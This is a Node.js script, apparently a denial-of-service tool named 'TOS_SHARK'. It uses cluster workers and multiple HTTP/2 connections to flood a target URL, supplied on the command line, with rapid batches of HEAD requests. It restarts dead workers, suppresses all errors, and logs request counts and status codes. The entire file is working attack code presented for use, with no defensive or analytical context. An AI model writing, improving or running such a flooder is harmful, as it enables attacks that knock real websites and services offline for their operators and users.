const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
    // Fork workers based on CPU cores
    const numCPUs = Math.min(os.cpus().length, 4);
    
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        // Restart worker if it dies
        setTimeout(() => {
            cluster.fork();
        }, 1000);
    });
    
    process.on('SIGINT', () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    
} else {
    // Worker code
    class TOS_SHARK {
        constructor(target) {
            this.target = target;
            this.running = true;
            this.totalReqs = 0;
            this.lastLog = Date.now();
            this.connections = [];
            this.connectionCount = 2; // 2 connections per worker (4 workers × 2 = 8 total)
            
            // Color codes
            this.colors = {
                reset: '\x1b[0m',
                darkMagenta: '\x1b[35m',
                darkGreen: '\x1b[32m',
                red: '\x1b[91m',
                green: '\x1b[92m'
            };
            
            this.startAttack();
        }

        async startAttack() {
            // Create connections
            for (let i = 0; i < this.connectionCount; i++) {
                try {
                    const client = http2.connect(this.target, {
                        maxSessionMemory: 1024 * 1024,
                        maxDeflateDynamicTableSize: 4096,
                        maxHeaderListPairs: 64
                    });
                    this.connections.push(client);
                    
                    client.on('error', () => {});
                } catch (err) {}
            }
            
            // Use setImmediate for non-blocking loops
            this.sendRequests();
        }

        sendRequests() {
            const sendFromConnection = (client) => {
                if (!this.running || !client || client.destroyed) return;
                
                // Send 30 requests in micro-batch
                for (let i = 0; i < 30; i++) {
                    this.sendH2Request(client);
                    this.totalReqs++;
                    
                    // Reset counter every 100k to prevent overflow
                    if (this.totalReqs > 1000000) {
                        this.totalReqs = 0;
                    }
                }
                
                // Log every 10 seconds
                const now = Date.now();
                if (now - this.lastLog >= 10000) {
                    this.lastLog = now;
                    this.logStatus(200);
                }
                
                // Schedule next batch with minimal delay
                setTimeout(() => sendFromConnection(client), 10);
            };
            
            // Start sending from each connection
            for (const client of this.connections) {
                sendFromConnection(client);
            }
        }

        sendH2Request(client) {
            // Minimal try-catch to prevent memory leaks
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': new URL(this.target).hostname
            }, {
                endStream: true
            });
            
            req.on('response', (headers) => {
                this.lastStatus = headers[':status'];
                req.close(); // Use close instead of destroy
            });
            
            req.on('error', () => {
                this.lastStatus = '*.*';
                req.close();
            });
            
            req.end();
        }

        logStatus(status) {
            const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
            
            let statusColor = this.colors.green;
            let statusText = this.lastStatus || status;
            
            if (statusText === '*.*') {
                statusColor = this.colors.red;
            } else if (typeof statusText === 'number') {
                statusColor = (statusText >= 200 && statusText < 300) ? this.colors.green : this.colors.red;
            }
            
            console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
        }
    }

    // Run worker
    if (require.main === module && process.argv[2]) {
        // Increase memory limits
        require('v8').setFlagsFromString('--max-old-space-size=2048');
        
        // Disable verbose error handling
        process.removeAllListeners('uncaughtException');
        process.removeAllListeners('unhandledRejection');
        process.on('uncaughtException', () => {});
        process.on('unhandledRejection', () => {});
        
        new TOS_SHARK(process.argv[2]);
    }
}
